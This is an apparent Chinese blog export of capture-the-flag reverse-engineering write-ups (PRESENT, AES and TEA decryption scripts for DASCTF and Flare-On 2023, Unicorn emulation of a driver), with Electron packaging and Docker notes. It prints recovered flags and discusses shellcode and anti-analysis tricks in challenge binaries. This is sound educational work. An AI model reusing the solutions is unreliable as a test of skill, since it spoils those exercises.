<p>还原流程：</p>
<pre><code class="python">Sbox = [12, 5, 6, 11, 9, 0, 10, 13, 3, 14, 15, 8, 4, 7, 1, 2]

Sbox_inv = [Sbox.index(x) for x in range(16)]

PBox = [
    0, 16, 32, 48, 1, 17, 33, 49, 2, 18, 34, 50, 3, 19, 35, 51,
    4, 20, 36, 52, 5, 21, 37, 53, 6, 22, 38, 54, 7, 23, 39, 55,
    8, 24, 40, 56, 9, 25, 41, 57, 10, 26, 42, 58, 11, 27, 43, 59,
    12, 28, 44, 60, 13, 29, 45, 61, 14, 30, 46, 62, 15, 31, 47, 63
]

PBox_inv = [PBox.index(x) for x in range(64)]


def addRoundKey(state, roundkey):
    return state ^ roundkey


def sBoxLayer(state):
    output = 0
    for i in range(16):
        output += Sbox[(state &gt;&gt; (i * 4)) &amp; 15] &lt;&lt; (i * 4)
    return output


def pLayer(state):
    output = 0
    for i in range(64):
        output += ((state &gt;&gt; i) &amp; 1) &lt;&lt; PBox[i]
    return output


def string2number(i):
    return sum([(ord(i[c]) &lt;&lt; (8 * c)) for c in range(8)])


def generateRoundkeys80(key, rounds):
    roundkeys = []
    for i in range(1, rounds + 1):
        roundkeys.append(key &gt;&gt; 16)

        key = ((key &amp; 524287) &lt;&lt; 61) + (key &gt;&gt; 19)

        key = (Sbox[key &gt;&gt; 76] &lt;&lt; 76) + (key &amp; ((2 ** 76) - 1))

        key ^= (i &lt;&lt; 15) ^ (key &gt;&gt; 19)
    return roundkeys


def encrypt(blocks):
    rounds = 32
    roundkeys = generateRoundkeys80(85354531916197809168417, rounds)
    out = []

    for block in blocks:
        state = string2number(block)

        for i in range(rounds - 1):
            state = addRoundKey(state, roundkeys[i])
            state = sBoxLayer(state)
            state = pLayer(state)

        cipher = addRoundKey(state, roundkeys[-1])
        out.append(cipher)

    return out


inp = input(&#39;pls input ur flag:&#39;)

if len(inp) != 32:
    print(&#39;wrong flag!&#39;)
    exit(0)

blocks = [inp[:8], inp[8:16], inp[16:24], inp[24:32]]

cmps = [120617461261311902, 16357837616839286114, 312508749794633008, 1843701600916795272]

out_blocks = encrypt(blocks)

for i in range(4):
    if cmps[i] != out_blocks[i]:
        print(&#39;wrong flag!&#39;)
        exit(0)

print(&#39;Correct!&#39;)
</code></pre>
<p>是个PRESENT加密</p>
<p>解密exp：</p>
<pre><code class="python">Sbox = [12, 5, 6, 11, 9, 0, 10, 13, 3, 14, 15, 8, 4, 7, 1, 2]

Sbox_inv = [Sbox.index(x) for x in range(16)]

PBox = [
    0, 16, 32, 48, 1, 17, 33, 49, 2, 18, 34, 50, 3, 19, 35, 51,
    4, 20, 36, 52, 5, 21, 37, 53, 6, 22, 38, 54, 7, 23, 39, 55,
    8, 24, 40, 56, 9, 25, 41, 57, 10, 26, 42, 58, 11, 27, 43, 59,
    12, 28, 44, 60, 13, 29, 45, 61, 14, 30, 46, 62, 15, 31, 47, 63
]

PBox_inv = [PBox.index(x) for x in range(64)]


def addRoundKey(state, roundkey):
    return state ^ roundkey


def generateRoundkeys80(key, rounds):
    roundkeys = []
    for i in range(1, rounds + 1):
        roundkeys.append(key &gt;&gt; 16)

        key = ((key &amp; 524287) &lt;&lt; 61) + (key &gt;&gt; 19)

        key = (Sbox[key &gt;&gt; 76] &lt;&lt; 76) + (key &amp; ((2 ** 76) - 1))

        key ^= (i &lt;&lt; 15) ^ (key &gt;&gt; 19)
    return roundkeys


def inv_sBoxLayer(state):
    output = 0
    for i in range(16):
        output += Sbox_inv[(state &gt;&gt; (i * 4)) &amp; 15] &lt;&lt; (i * 4)
    return output


def inv_pLayer(state):
    output = 0
    for i in range(64):
        output += ((state &gt;&gt; i) &amp; 1) &lt;&lt; PBox_inv[i]
    return output


def number2string(n):
    chars = []
    for i in range(8):
        chars.append(chr((n &gt;&gt; (i * 8)) &amp; 0xFF))
    return &#39;&#39;.join(chars)


def decrypt(ciphers):
    rounds = 32
    roundkeys = generateRoundkeys80(85354531916197809168417, rounds)
    out = []

    for cipher in ciphers:
        state = cipher

        for i in range(rounds - 1, 0, -1):
            state = addRoundKey(state, roundkeys[i])
            state = inv_pLayer(state)
            state = inv_sBoxLayer(state)

        block = addRoundKey(state, roundkeys[0])
        out.append(number2string(block))

    return &#39;&#39;.join(out)


cmps = [120617461261311902, 16357837616839286114, 312508749794633008, 1843701600916795272]

decrypted_flag = decrypt(cmps)
print(decrypted_flag)
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>das202311月赛</title>
    <url>/2023/11/26/das202311%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h6 id="PREFACE：说实话一直打不明白这个das，这今年最后一次算是比较认真打的一次，最后是稳稳第一拿下了但是好像和我关系不大…不能说没有贡献吧但是光自己做肯定是差很多的…还是tcl5555555"><a href="#PREFACE：说实话一直打不明白这个das，这今年最后一次算是比较认真打的一次，最后是稳稳第一拿下了但是好像和我关系不大…不能说没有贡献吧但是光自己做肯定是差很多的…还是tcl5555555" class="headerlink" title="PREFACE：说实话一直打不明白这个das，这今年最后一次算是比较认真打的一次，最后是稳稳第一拿下了但是好像和我关系不大…不能说没有贡献吧但是光自己做肯定是差很多的…还是tcl5555555"></a>PREFACE：说实话一直打不明白这个das，这今年最后一次算是比较认真打的一次，最后是稳稳第一拿下了但是好像和我关系不大…不能说没有贡献吧但是光自己做肯定是差很多的…还是tcl5555555</h6><span id="more"></span>

<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>帮着看了一眼，有一道题提出来的是一个upx打包的elf，简单分析发现用的<code>upx-4.2.1-amd64_linux</code>版本，直接官网找了再upx -d即可，里面base64变表，解出来即可</p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="letsgo"><a href="#letsgo" class="headerlink" title="letsgo"></a>letsgo</h3><p>dll里面upx 3.94，自己<code>upx file</code>加一个dll壳，发现了三四个被修改了的标志位，修复即可<code>upx -d</code></p>
<p>主程序没东西，有两个地方加载了dll，断点查看，这里是抽卡用的逻辑</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127102107311.png" alt="image-20231127102107311"></p>
<p>里面有解压图片的操作：</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127102211939.png" alt="image-20231127102211939"></p>
<pre><code class="python">def split_and_process_file(input_file_path):
    # 读取原始文件
    with open(input_file_path, &#39;rb&#39;) as file:
        data = file.read()

    bytes_array = bytearray(data)
    for i in range(len(bytes_array) - 1, -1, -1):
        if i + 2 &lt; len(bytes_array):
            bytes_array[i] ^= bytes_array[i + 2]
            bytes_array[i] ^= 0xf
        bytes_array[i] ^= 0xf

    with open(f&#39;output_&#123;1&#125;.jpg&#39;, &#39;wb&#39;) as output_file:
        output_file.write(bytes_array)

split_and_process_file(&#39;D:\\reverse\\challange\\das11\\re\\DAS10letsgo\\letsgo\\res\\wwww&#39;)

def split_and_process_file(input_file_path):
    with open(input_file_path, &#39;rb&#39;) as file:
        data = file.read()

    split_pattern = b&#39;\xff\xd8\xff\xe0&#39;

    parts = data.split(split_pattern)

    for part_index, part in enumerate(parts):
        bytes_array = bytearray(b&#39;\xFF\xD8\xFF\xE0&#39;) + bytearray(part)
        with open(f&#39;flag_&#123;part_index&#125;.jpg&#39;, &#39;wb&#39;) as output_file:
            output_file.write(bytes_array)

split_and_process_file(&#39;output_1.jpg&#39;)
</code></pre>
<p>你们二次元差不多得了</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127102432655.png" alt="image-20231127102432655"></p>
<p>于是你发现前面做的没有意义</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127102447196.png" alt="image-20231127102447196"></p>
<p>那就只有这里了：</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127102819995.png" alt="image-20231127102819995"></p>
<p>这里拿到key：</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127102859858.png" alt="image-20231127102859858"></p>
<p>这里是啥呢：</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127103327070.png" alt="image-20231127103327070"></p>
<p>画一下图发现是蒙特卡罗模拟π，下面<code>COERCE_UNSIGNED_INT64</code>强制将π解释为整数，然后作为seed生成一组xor用的随机数</p>
<p>下面就是一个aes192，这里ida反编译不出来，看看汇编即可找到key和密文</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127103525934.png" alt="image-20231127103525934"></p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127103542503.png" alt="image-20231127103542503"></p>
<p>最搞心态的一点是，这里的蒙特卡罗模拟是跑不出来的（而且本身模拟golang也是一个相当麻烦的操作），首先你得猜这里就是π，以及四舍五入的情况，进行一定量的爆破操作，结果这地方魔改源码在rand里面多加了一个异或！</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127103758800.png" alt="image-20231127103758800"></p>
<p>给你逆天逆完了</p>
<p>脚本：</p>
<pre><code class="go">package main

import (
    &quot;fmt&quot;
    &quot;math&quot;
    &quot;math/rand&quot;
)

func main() &#123;
    bits := math.Float64bits(math.Pi)
    val := bits % 0x5F5E100
    rand.Seed(int64(val))
    key := make([]int, 0)
    for i := 0; i &lt; 24; i++ &#123;
        key = append(key, (rand.Int()^0xa)%100)
    &#125;
    fmt.Println(key)
&#125;
</code></pre>
<pre><code class="python">import struct
from Crypto.Cipher import AES

arr = [37, 49, 98, 48, 14, 17, 9, 47, 56, 91, 37, 69, 17, 3, 82, 64, 54, 76, 80, 88, 54, 97, 0, 53]
rawkey = struct.pack(&quot;&lt;3Q&quot;, 0x5B566461493D5E41, 0x293A774E2E4B3250, 0x4C650A692B391345)
print(rawkey)
for i in range(len(arr)):
    arr[i] ^= rawkey[i]

key = bytes(arr)
aes = AES.new(key, AES.MODE_ECB)
m1 = aes.decrypt(bytes.fromhex(&quot;ff44ac7700732a16589f7ff8bdbaa923&quot;))
m2 = aes.decrypt(bytes.fromhex(&quot;57c29c367a781ead5fb143469d75f319&quot;))
print(m1 + m2)
</code></pre>
<h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><p>…</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127104104569.png" alt="image-20231127104104569"></p>
<p>反编译拿到：</p>
<pre><code class="python">#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.11

import pyDes

def adjust_length(str):
    if len(str) &lt; 8:
        str = str.ljust(8, &#39;0&#39;)
    elif len(str) &gt; 8:
        str = str[:8]
    return str


def yuanshen(array, start, end):
    num = len(array)
    dis = [
        float(&#39;inf&#39;)] * num
    tree = [
        False] * num
    parent = [
        -1] * num
    dis[start] = 0
# WARNING: Decompyle incomplete


def qidong(input, key, IV):
    cipher = pyDes.des(key, pyDes.CBC, IV, pad = None, padmode = pyDes.PAD_PKCS5)
    encrypted_data = cipher.encrypt(input)
    encrypted_hex_list = encrypted_data()
    return encrypted_hex_list


def main():
    data = [
        159,
        41,
        201,
        125,
        67,
        60,
        44,
        34,
        203,
        56,
        116,
        186,
        13,
        71,
        125,
        30,
        84,
        123,
        109,
        54,
        106,
        56,
        17,
        124,
        87,
        236,
        25,
        12,
        80,
        178,
        165,
        123]
    key = input(&#39;请输入key: &#39;)
    if len(key) != 8:
        print(&#39;wrong key lenth!&#39;)
        exit()
    flag = input(&#39;请输入flag: &#39;)
    array = [
        [
            0,
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            1,
            3,
            4,
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            float(&#39;inf&#39;)],
        [
            float(&#39;inf&#39;),
            0,
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            2,
            float(&#39;inf&#39;),
            4,
            float(&#39;inf&#39;)],
        [
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            0,
            8,
            1,
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            1],
        [
            1,
            float(&#39;inf&#39;),
            8,
            0,
            3,
            5,
            1,
            2,
            float(&#39;inf&#39;)],
        [
            3,
            float(&#39;inf&#39;),
            1,
            3,
            0,
            float(&#39;inf&#39;),
            1,
            5,
            3],
        [
            4,
            2,
            float(&#39;inf&#39;),
            5,
            float(&#39;inf&#39;),
            0,
            float(&#39;inf&#39;),
            1,
            float(&#39;inf&#39;)],
        [
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            1,
            1,
            float(&#39;inf&#39;),
            0,
            float(&#39;inf&#39;),
            5],
        [
            float(&#39;inf&#39;),
            4,
            float(&#39;inf&#39;),
            2,
            5,
            1,
            5,
            0,
            float(&#39;inf&#39;)],
        [
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            1,
            float(&#39;inf&#39;),
            3,
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            float(&#39;inf&#39;),
            0]]
    t = yuanshen(array, 1, 8)
    IV = (lambda .0: pass# WARNING: Decompyle incomplete
)(t())
    IV = adjust_length(IV)
    check = qidong(flag, key, IV)
    if check == data:
        print(&#39;yes,yes,yes!!&#39;)
        return None
    &#39;&#39;.join(&#39;bad,bad,bad!!&#39;)

main()
</code></pre>
<p>反编译有问题，iv拿不到，但是就差八位</p>
<p><img src="/2023/11/26/das202311%E6%9C%88%E8%B5%9B/image-20231127111045546.png" alt="image-20231127111045546"></p>
<p>晚点出个完整的python各个版本应对策略（立flag&amp;鸽）dis一下自己看</p>
<p>结合一下就加上<code>DASCTF&#123;</code>呗，给他爆一位：<code>DASCTF&#123;D0_U_4ls0_l1k3_7uansH3n&#125;</code></p>
<p>TODO：后面再补，<del>感觉麻烦死了新东西也不多</del> ，懒了</p>
]]></content>
  </entry>
  <entry>
    <title>electron 打包</title>
    <url>/2023/09/06/electron-%E6%89%93%E5%8C%85/</url>
    <content><![CDATA[<h6 id="preface：小学期作业新加的需求，原来没玩过，记录一下"><a href="#preface：小学期作业新加的需求，原来没玩过，记录一下" class="headerlink" title="preface：小学期作业新加的需求，原来没玩过，记录一下"></a>preface：小学期作业新加的需求，原来没玩过，记录一下</h6><span id="more"></span>

<p>[参考知乎](<a href="https://zhuanlan.zhihu.com/p/430760821">使用Electron给Python程序加上GUI - 知乎 (zhihu.com)</a>)</p>
<h5 id="1-打包python文件"><a href="#1-打包python文件" class="headerlink" title="1.打包python文件"></a>1.打包python文件</h5><h5 id="2-修改js中调用python的代码"><a href="#2-修改js中调用python的代码" class="headerlink" title="2.修改js中调用python的代码"></a>2.修改js中调用python的代码</h5><h5 id="3-构建文件并打包electron"><a href="#3-构建文件并打包electron" class="headerlink" title="3.构建文件并打包electron"></a>3.构建文件并打包electron</h5><hr>
<h5 id="1-打包python文件-1"><a href="#1-打包python文件-1" class="headerlink" title="1.打包python文件"></a>1.打包python文件</h5><ul>
<li>nuitka打包</li>
</ul>
<p><code>pip install nuitka</code></p>
<p><code>python -m nuitka frontend.py --follow-imports</code> (–follow-imports 会附带打包依赖)</p>
<ul>
<li>pyinstaller</li>
</ul>
<p><code>pyinstaller -F C:\Users\18238\Downloads\packTest\byrFileShare-frontend\client\frontend.py</code></p>
<h5 id="2-修改js中调用python的代码-1"><a href="#2-修改js中调用python的代码-1" class="headerlink" title="2.修改js中调用python的代码"></a>2.修改js中调用python的代码</h5><pre><code class="js">const &#123; spawn &#125; = require(&#39;child_process&#39;);
const python = spawn(&#39;python&#39;, [&#39;\frontend.exe&#39;]);
</code></pre>
<p><img src="/2023/09/06/electron-%E6%89%93%E5%8C%85/image-20230906102010240.png" alt="image-20230906102010240"></p>
<h5 id="3-构建文件并打包electron-1"><a href="#3-构建文件并打包electron-1" class="headerlink" title="3.构建文件并打包electron"></a>3.构建文件并打包electron</h5><p><code>npm install electron --save-dev</code></p>
<p><code>npm init</code></p>
<pre><code class="json"># package.json
&#123;
  &quot;name&quot;: &quot;your-app&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;main&quot;: &quot;C:/Users/18238/Downloads/packTest/byrFileShare-frontend/frontend/main.js&quot;,
  &quot;scripts&quot;: &#123;
    &quot;start&quot;: &quot;electron .&quot;,
    &quot;package&quot;: &quot;electron-packager ./ test --platform=win32 --arch=x64&quot;
  &#125;,
  &quot;dependencies&quot;: &#123;
    &quot;electron-packager&quot;: &quot;^17.1.2&quot;
  &#125;,
  &quot;devDependencies&quot;: &#123;
    &quot;electron&quot;: &quot;^latest-version&quot;
  &#125;
&#125;
</code></pre>
<p><code>npm run package</code></p>
]]></content>
  </entry>
  <entry>
    <title>flare-on2023</title>
    <url>/2023/10/04/flare-on2023/</url>
    <content><![CDATA[<h6 id="PREFACE-很有含金量的题，有点小难，而且和平时做的差别很大，稍稍有点不对感觉，但是做起来能学到很多东西"><a href="#PREFACE-很有含金量的题，有点小难，而且和平时做的差别很大，稍稍有点不对感觉，但是做起来能学到很多东西" class="headerlink" title="PREFACE: 很有含金量的题，有点小难，而且和平时做的差别很大，稍稍有点不对感觉，但是做起来能学到很多东西."></a>PREFACE: 很有含金量的题，有点小难，而且和平时做的差别很大，稍稍有点不对感觉，但是做起来能学到很多东西.</h6><h6 id="ps-边记边写吧…挺大强度的后面怕忘了…另外这国庆怎么快没了…"><a href="#ps-边记边写吧…挺大强度的后面怕忘了…另外这国庆怎么快没了…" class="headerlink" title="ps. 边记边写吧…挺大强度的后面怕忘了…另外这国庆怎么快没了…"></a>ps. 边记边写吧…挺大强度的后面怕忘了…另外这国庆怎么快没了…</h6><h3 id="X"><a href="#X" class="headerlink" title="X"></a>X</h3><p>dotpeek打开直接秒：<code>glorified_captcha@flare-on.com</code> （这flag格式和平时都不一样……）</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004185236537.png" alt="image-20231004185236537"></p>
<h3 id="ItsOnFire"><a href="#ItsOnFire" class="headerlink" title="ItsOnFire"></a>ItsOnFire</h3><p>最好是新版jeb打开，会自动解析res资源，这里的字符串基本上都是从res里面提的，自己翻会很痛苦</p>
<p>和一般的题确实差别不小，这里的flag逻辑和游戏本身关系并不大，翻翻可以找到这个<code>MessageWorker</code>有可疑的地方</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004185529273.png" alt="image-20231004185529273"></p>
<p>一步步翻：</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004185613934.png" alt="image-20231004185613934"></p>
<p>这里的类名混淆其实很有效，不仔细就容易看漏555</p>
<p>往下翻</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004185723229.png" alt="image-20231004185723229"></p>
<p>找到AES逻辑，对图片进行解密</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004185746882.png" alt="image-20231004185746882"></p>
<p>秘钥生成的逻辑：</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004185818436.png" alt="image-20231004185818436"></p>
<p>iv上面有了</p>
<p>exp.py:</p>
<pre><code class="python">import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
def compute_key(base_string):
    crc_val = binascii.crc32(base_string.encode())
    key = (str(crc_val) * 2)[:16]
    return key

a = &#39;https://flare-on.com/evilc2server/report_token/report_token.php?token=&#39;
b = &#39;wednesday&#39;
key_ori = a[4:10] + b[2:5]
def decrypt_aes_cbc(input_filename, output_filename):
    key = compute_key(&quot;s://fldne&quot;)
    iv = &quot;abcdefghijklmnop&quot;.encode()

    with open(input_filename, &#39;rb&#39;) as file:
        encrypted_hex_data = file.read().hex()
    encrypted_data = bytes.fromhex(encrypted_hex_data)
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    with open(output_filename, &#39;wb&#39;) as file:
        file.write(decrypted_data)

if __name__ == &quot;__main__&quot;:
    input_filename = &quot;iv.png&quot;
    output_filename = &quot;outputiv.png&quot;
    decrypt_aes_cbc(input_filename, output_filename)

# YOUr3_ON_F1r3_K33P_6O1N6@flare-on.com
</code></pre>
<p><img src="/2023/10/04/flare-on2023/outputiv.png" alt="outputiv"></p>
<h3 id="mypassion"><a href="#mypassion" class="headerlink" title="mypassion"></a>mypassion</h3><h6 id="上强度了…-10-4-基本上做了一半…慢慢看…"><a href="#上强度了…-10-4-基本上做了一半…慢慢看…" class="headerlink" title="上强度了… 10.4:基本上做了一半…慢慢看…"></a>上强度了… 10.4:基本上做了一半…慢慢看…</h6><p>相当长的check逻辑，前面的并不是flag，也就是前面的部分需要保证成功运行过了即可（虽然听着简单，实际上很不简单）</p>
<p><code>main函数</code>框定了大体的框架，可以看出来输入方式以及部分输入位（这里的check就不是很严格，某种意义上在按暗示你前面不是flag了，不过确实没啥经验，前面还做了挺久）</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004190415608.png" alt="image-20231004190415608"></p>
<p>这里有一位shellcode汇编的爆破，可以用capstone枚举猜一下，还算比较容易</p>
<p>然后注册了一张表，后续都会从这张表里面调用函数</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004195639784.png" alt="image-20231004195639784"></p>
<p>下来这一层，给出了input的整体框架：<code>***/***/***/***/***/</code>类似这样，每层会用<code>/</code>切割检查其中的内容</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004190838143.png" alt="image-20231004190838143"></p>
<p>然后很多trick，直接放我目前的结论（估计不完全准确，但是能过就行）</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004191225471.png" alt="image-20231004191225471"></p>
<p><img src="/2023/10/04/flare-on2023/image-20231004191235080.png" alt="image-20231004191235080"></p>
<p>里面有个tick的函数会计时，如果运行程序太快也会触发退出……（它的check不仅有exitProcess,还有前面的重启电脑、sleep、tick等等，也是需要注意看）</p>
<p>继续往下，到第二个斜杠了，目前就到这样：<code>0;;**R@brUc3E/1337aaa/0/*pizza</code>中间那个数会复制，放到后面文件名里的文件去，再往后是四进制 &#x3D; 长度，0或1a均可，然后pizza是固定的，第0位随机即可</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004191911752.png" alt="image-20231004191911752"></p>
<p><img src="/2023/10/04/flare-on2023/image-20231004191929255.png" alt="image-20231004191929255"></p>
<p>然后来了个难点，这里需要往里面填shellcode，这里是不能硬过的，会影响下文，必须把所有shellcode缺失位全部填上……</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004192218833.png" alt="image-20231004192218833"></p>
<p><img src="/2023/10/04/flare-on2023/image-20231004192306788.png" alt="image-20231004192306788"></p>
<p>可以观察我们需要填出来的函数：（高手学长师傅看出来这里是<code>InMemoryOrderModuleList</code>，v4大概是个这个函数<code>GetExportedFunctionAddress64</code>）</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004192329092.png" alt="image-20231004192329092"></p>
<p>进到v4，第一个汇编就是0x65，即组成：<code>mov     rax, gs:60h</code></p>
<h6 id="这一段晚点补，有点复杂的"><a href="#这一段晚点补，有点复杂的" class="headerlink" title="这一段晚点补，有点复杂的"></a>这一段晚点补，有点复杂的</h6><p>下一段</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004214714348.png" alt="image-20231004214714348"></p>
<p>目前的input：</p>
<pre><code>0;;**R@brUc3E/1337pr.ost/0/*pizza/AMu$E`0R.?AZe/YPXEKCZXYIGMNOXNMXPYCXGXN/ob5cUr3/111
</code></pre>
<p><img src="/2023/10/04/flare-on2023/image-20231004221540631.png" alt="image-20231004221540631"></p>
<p>后面小nop一下，就有了（虽然不知道为什么最后没com)</p>
<p><img src="/2023/10/04/flare-on2023/image-20231004230518770.png" alt="image-20231004230518770"></p>
<pre><code>b0rn_t0_5truc7_b4by@flare-on.com
</code></pre>
<h6 id="总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）"><a href="#总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）" class="headerlink" title="总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）"></a>总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）</h6>]]></content>
  </entry>
  <entry>
    <title>docker操作记录</title>
    <url>/2023/10/03/docker%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="PREFACE：记录"><a href="#PREFACE：记录" class="headerlink" title="PREFACE：记录"></a>PREFACE：记录</h6><span id="more"></span>

<p>构建docker镜像：</p>
<pre><code>docker-compose build
</code></pre>
<p>启动docker至后台：</p>
<pre><code>docker-compose up -d
</code></pre>
<p>进入docker进行交互：</p>
<pre><code>docker exec -it compiler /bin/bash
</code></pre>
<p>以命令行模式进入docker：</p>
<pre><code>docker run -it ubuntu /bin/bash
</code></pre>
<p>退出docker：</p>
<pre><code>exit
</code></pre>
<p>停止与删除容器：</p>
<pre><code> docker-compose down
</code></pre>
<p>查看所有docker：</p>
<pre><code>docker ps -a
</code></pre>
<p>启动已经停止的docker：</p>
<pre><code>docker start &lt;容器 ID&gt;
</code></pre>
<p>指定docker运行模式（-d不进入docker）：</p>
<pre><code>docker run -itd --name ubuntu-test ubuntu /bin/bash
</code></pre>
<p>sleep休眠状态，保持容器运行：</p>
<pre><code>docker run -d python313 sleep infinity
</code></pre>
<p>停止容器：</p>
<pre><code>docker stop &lt;容器 ID&gt;
</code></pre>
<p>进入正在后台的容器：</p>
<pre><code>docker attach
</code></pre>
<p>退出容器终端但不停止：</p>
<pre><code>docker exec
</code></pre>
<p>重新进入容器交互界面</p>
<pre><code>docker exec -it &lt;容器 ID&gt; /bin/bash
</code></pre>
<p>导出容器快照：</p>
<pre><code>docker export 1e560fca3906 &gt; ubuntu.tar
</code></pre>
<p>重将容器快照导入为镜像：</p>
<pre><code>cat docker/ubuntu.tar | docker import - test/ubuntu:v1
</code></pre>
<p>或</p>
<pre><code>docker import http://example.com/exampleimage.tgz example/imagerepo
</code></pre>
<p>删除容器：</p>
<pre><code>docker rm -f 1e560fca3906
</code></pre>
<p>传入文件：</p>
<pre><code>docker cp file &lt;容器 ID&gt;:/app/file
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>driver复现(铁三2024)</title>
    <url>/2024/04/02/driver%E5%A4%8D%E7%8E%B0-%E9%93%81%E4%B8%892024/</url>
    <content><![CDATA[<h6 id="PREFACE：之前看了不少驱动开发，然后发现这题调不起来，静态解不出来，赛后速通unicorn写了个模拟看看"><a href="#PREFACE：之前看了不少驱动开发，然后发现这题调不起来，静态解不出来，赛后速通unicorn写了个模拟看看" class="headerlink" title="PREFACE：之前看了不少驱动开发，然后发现这题调不起来，静态解不出来，赛后速通unicorn写了个模拟看看"></a>PREFACE：之前看了不少驱动开发，然后发现这题调不起来，静态解不出来，赛后速通unicorn写了个模拟看看</h6><span id="more"></span>

<p>首先，可以看到文件的前0x400字符是文件头信息，先rebase+0x400</p>
<p>这里直接贴一个unicorn脚本，可以看到tea的操作，前后转化了一次端序然后标准TEA， which is WRONG：</p>
<pre><code class="python">from unicorn import *
from unicorn.x86_const import *
import struct
from capstone import *
REAL_BASE_OFFSET = 0x400
md = Cs(CS_ARCH_X86, CS_MODE_64)
def read(name):
    with open(name,&#39;rb&#39;) as f:
        return f.read()

def hookDbgPrint(mu,address,size,user_data):
    code = mu.mem_read(address, size)
    # for instruction in md.disasm(code, address):
    #     print(&quot;0x%x: %s %s&quot; % (instruction.address, instruction.mnemonic, instruction.op_str))
    DbgList = [0x1400015C9]
    if (address in DbgList):
        mu.reg_write(UC_X86_REG_RIP, address+5)
        print(f&quot;hook: &#123;address&#125;&quot;)
    if (address == 0x140001940):
        TEAoutput = mu.mem_read(mu.reg_read(UC_X86_REG_RAX), 32)
    if (address == 0x1400017DB):
        # mu.mem_write(mu.reg_read(UC_X86_REG_RSP) + 40, b&#39;12345678&#39;)
        TEAinput = mu.mem_read(mu.reg_read(UC_X86_REG_RSP) + 40, 8)
        print(&quot;tea in: &quot;,bytes(TEAinput))
    if (address == 0x14000166D):
        mu.mem_write(mu.reg_read(UC_X86_REG_RSP) + 144, b&#39;12345678&#39;)
    if (address == 0x14000182D):
        TEAoutput = mu.mem_read(mu.reg_read(UC_X86_REG_RSP) + 40, 8)
        print(&quot;tea out: &quot;,end=&#39;&#39;)
        for i in TEAoutput:
            print(i,end=&#39;,&#39;)
        print()
    if (address == 0x14000197A):
        ENCoutput = mu.mem_read(mu.reg_read(UC_X86_REG_RSP) + 40, 8)
        print(&quot;enc out:&quot;,end=&#39;&#39;)
        for i in ENCoutput:
            print(i,end=&#39;,&#39;)
        print()

def hookEND(mu : Uc,address,size,user_data):
    if (address == 0x14000197A):
        print(&quot;end&quot;)
        # exit(0)
        mu.emu_stop()

mu = Uc (UC_ARCH_X86, UC_MODE_64)
BASE = 0x140001000
STACK_ADDR = 0x1000
STACK_SIZE = 1024*1024
mu.mem_map(BASE, 1024*1024)
mu.mem_map(STACK_ADDR, STACK_SIZE)
mu.mem_write(BASE, read(&quot;./ez_driver.sys&quot;))
mu.reg_write(UC_X86_REG_RBP, STACK_ADDR + STACK_SIZE // 2)
mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE // 3)
mu.hook_add(UC_HOOK_CODE,hookDbgPrint)
mu.hook_add(UC_HOOK_CODE,hookEND)
mu.emu_start(0x14000161D, 0x140004000)
</code></pre>
<p>另一个加密就是对称的，其实看了就知道只做了xor，重写一遍就行：</p>
<pre><code class="cpp">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
BYTE byte_140004000[] =
&#123;
    0x72, 0x62, 0xAE, 0x34, 0x52, 0x9A, 0x06, 0xAF, 
    0x72, 0xFB, 0x40, 0xC0, 0x10, 0x35, 0xBD, 0xD4,
